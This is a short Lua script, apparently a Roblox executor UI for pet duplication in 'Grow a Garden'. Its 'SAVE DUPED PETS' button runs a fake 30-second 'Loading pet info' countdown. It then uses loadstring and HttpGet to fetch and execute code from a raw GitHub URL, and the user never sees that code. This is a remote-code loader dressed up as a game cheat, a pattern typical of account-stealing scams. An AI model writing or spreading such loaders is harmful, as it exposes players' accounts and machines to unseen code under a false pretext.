-- 状態ラベルを再作成する関数
local statusLabel -- グローバルに保持しておく

local function setStatus(text)
	-- 既存ラベルを削除（可能な場合）
	if statusLabel then
		statusLabel:Destroy()
	end
	-- 新しいラベル作成
	statusLabel = MainSection:NewLabel("SAVE STATUS: " .. text)
end

-- 初期表示
setStatus("Ready")

-- SAVE DUPED PETS ボタン
MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
	task.spawn(function()
		for i = 30, 1, -1 do
			setStatus("⌛ Loading pet info... (" .. i .. "s)")
			wait(1)
		end

		setStatus("🚀 Booting...")

		local success, err = pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
		end)

		if success then
			setStatus("✅ Success!")
		else
			setStatus("❌ Error: " .. tostring(err))
		end
	end)
end)
